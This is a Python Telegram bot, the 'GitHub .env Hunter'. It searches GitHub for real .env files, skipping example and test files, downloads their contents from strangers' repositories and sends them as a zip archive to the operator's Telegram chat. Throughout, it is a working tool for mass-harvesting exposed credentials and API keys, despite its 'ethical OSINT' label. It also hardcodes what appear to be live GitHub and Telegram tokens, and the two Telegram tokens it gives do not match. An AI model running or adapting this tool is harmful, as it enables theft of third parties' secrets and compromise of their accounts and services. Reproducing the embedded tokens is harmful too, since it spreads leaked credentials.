#!/usr/bin/env python3
"""
Telegram Controlled GitHub .env Hunter
- Telegram Token: 8525746028:AAFR-YEKmhYr_UxK2ay7C8k9pSCyP0nQc28
- GitHub Token: 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
"""
import os
import json
import asyncio
import aiohttp
import zipfile
import tempfile
from typing import Dict, Optional, List
from datetime import datetime

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== CONFIGURATION ====================
GITHUB_TOKEN = "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"   # Your provided token
TELEGRAM_TOKEN = "8626025191:AAFGtpDgtl-jfRTGvVejOMelDEFGQGPJoGI"  # Your bot token

# ==================== CORE SCANNER ENGINE ====================
class GitHubEnvHunter:
    def __init__(self, token: str, max_results: int, progress_callback):
        self.token = token
        self.max_results = min(max_results, 1000)
        self.progress_callback = progress_callback
        self.cancel_flag = False
        self.headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json",
        }
        self.base_api = "https://api.github.com"
        self.seen_cache = set()
        self.downloaded_files = []  # list of dicts with content

    async def _send_update(self, msg: str):
        if self.progress_callback:
            await self.progress_callback(msg)

    async def _search_code(self, session: aiohttp.ClientSession, page: int) -> Dict:
        query = 'extension:env -example -sample -test -docker'
        url = f"{self.base_api}/search/code"
        params = {"q": query, "per_page": 100, "page": page}

        async with session.get(url, params=params, headers=self.headers) as resp:
            if resp.status == 403:
                reset_time = resp.headers.get("X-RateLimit-Reset")
                if reset_time:
                    wait_seconds = int(reset_time) - int(datetime.now().timestamp()) + 5
                    if wait_seconds > 0:
                        await self._send_update(f"⏳ Rate limit hit. Sleeping {wait_seconds}s...")
                        await asyncio.sleep(wait_seconds)
                        return await self._search_code(session, page)
                else:
                    raise Exception("Rate limit exceeded.")
            if resp.status != 200:
                raise Exception(f"API Error {resp.status}: {await resp.text()}")
            return await resp.json()

    async def _fetch_and_save(self, session: aiohttp.ClientSession, item: Dict) -> Optional[str]:
        repo = item["repository"]["full_name"]
        path = item["path"]
        branch = item["repository"]["default_branch"]
        raw_url = f"https://raw.githubusercontent.com/{repo}/{branch}/{path}"

        cache_key = f"{repo}:{path}"
        if cache_key in self.seen_cache:
            return None
        self.seen_cache.add(cache_key)

        try:
            async with session.get(raw_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    self.downloaded_files.append({
                        "repo": repo,
                        "path": path,
                        "branch": branch,
                        "raw_url": raw_url,
                        "content": content,
                        "size": len(content)
                    })
                    return raw_url
                return None
        except Exception:
            return None

    async def run(self):
        await self._send_update(f"🚀 Scan started! Max results: {self.max_results}")
        async with aiohttp.ClientSession(headers={"User-Agent": "Mozilla/5.0"}) as session:
            page = 1
            total_retrieved = 0

            while total_retrieved < self.max_results:
                if self.cancel_flag:
                    await self._send_update("❌ Scan cancelled by user.")
                    return None

                await self._send_update(f"📄 Fetching page {page}...")
                data = await self._search_code(session, page)
                items = data.get("items", [])

                if not items:
                    await self._send_update("✅ No more results found.")
                    break

                total_retrieved += len(items)
                await self._send_update(f"📦 Found {len(items)} items (Total: {total_retrieved})")

                semaphore = asyncio.Semaphore(20)
                async def limited_fetch(item):
                    async with semaphore:
                        return await self._fetch_and_save(session, item)

                tasks = [limited_fetch(item) for item in items]
                results = await asyncio.gather(*tasks)
                success_count = sum(1 for r in results if r is not None)

                await self._send_update(f"💾 Downloaded {success_count} new .env files. (Total unique: {len(self.downloaded_files)})")

                if total_retrieved >= self.max_results:
                    break
                page += 1
                await asyncio.sleep(0.5)

            if not self.cancel_flag:
                await self._send_update(f"📦 Scan complete! Found {len(self.downloaded_files)} unique .env files. Creating archive...")
                return self.downloaded_files
            return None

# ==================== TELEGRAM BOT HANDLERS ====================
active_scans = {}       # chat_id -> asyncio.Task
scan_instances = {}     # chat_id -> GitHubEnvHunter instance

async def create_archive(files_data: List[Dict], chat_id: int) -> str:
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_name = f"env_findings_{chat_id}_{timestamp}.zip"
    temp_dir = tempfile.gettempdir()
    zip_path = os.path.join(temp_dir, zip_name)

    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        manifest = []
        for item in files_data:
            manifest.append({
                "repo": item["repo"],
                "path": item["path"],
                "raw_url": item["raw_url"],
                "size": item["size"]
            })
        zf.writestr("manifest.json", json.dumps(manifest, indent=2))

        for idx, item in enumerate(files_data):
            safe_name = f"{item['repo'].replace('/', '__')}__{item['path'].replace('/', '_')}"
            if len(safe_name) > 200:
                safe_name = f"{idx}_{safe_name[-190:]}"
            zf.writestr(safe_name, item["content"])

    return zip_path

async def run_scan_task(hunter: GitHubEnvHunter, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    global scan_instances
    scan_instances[chat_id] = hunter
    try:
        result = await hunter.run()
        if result is None:
            return

        if not result:
            await context.bot.send_message(chat_id=chat_id, text="😕 No .env files found!")
            return

        zip_path = await create_archive(result, chat_id)
        await context.bot.send_message(chat_id=chat_id, text=f"📤 Uploading {len(result)} files as archive...")
        with open(zip_path, 'rb') as f:
            await context.bot.send_document(
                chat_id=chat_id,
                document=f,
                filename=os.path.basename(zip_path),
                caption=f"✅ Found {len(result)} unique .env files from GitHub."
            )
        os.unlink(zip_path)

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ Error: {str(e)}")
    finally:
        if chat_id in active_scans:
            del active_scans[chat_id]
        if chat_id in scan_instances:
            del scan_instances[chat_id]

async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    if chat_id in active_scans and not active_scans[chat_id].done():
        await update.message.reply_text("⚠️ A scan is already running! Use /cancel to stop it.")
        return

    args = context.args
    max_results = 200
    if args and args[0].isdigit():
        max_results = int(args[0])
        if max_results > 1000:
            max_results = 1000

    await update.message.reply_text(f"🔍 Starting GitHub .env scan for max {max_results} results. I'll notify you when it's done!")

    async def send_progress(msg: str):
        try:
            await context.bot.send_message(chat_id=chat_id, text=msg)
        except Exception:
            pass

    hunter = GitHubEnvHunter(token=GITHUB_TOKEN, max_results=max_results, progress_callback=send_progress)
    task = asyncio.create_task(run_scan_task(hunter, chat_id, context))
    active_scans[chat_id] = task

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    hunter = scan_instances.get(chat_id)
    if hunter:
        hunter.cancel_flag = True
        await update.message.reply_text("🛑 Cancellation signal sent! Scan will stop shortly.")
    else:
        await update.message.reply_text("⚠️ No active scan to cancel.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in active_scans and not active_scans[chat_id].done():
        await update.message.reply_text("🔄 A scan is currently running.")
    else:
        await update.message.reply_text("✅ No scan running. Use /scan to start.")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *GitHub .env Hunter Bot*\n\n"
        "Commands:\n"
        "/scan <max_results> - Start scanning (default 200, max 1000)\n"
        "/cancel - Stop current scan\n"
        "/status - Check if scan is running\n\n"
        "Made for ethical OSINT & security research.",
        parse_mode="Markdown"
    )

# ==================== MAIN ====================
def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("scan", scan_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(CommandHandler("status", status_command))

    print("🤖 Bot is running... Press Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
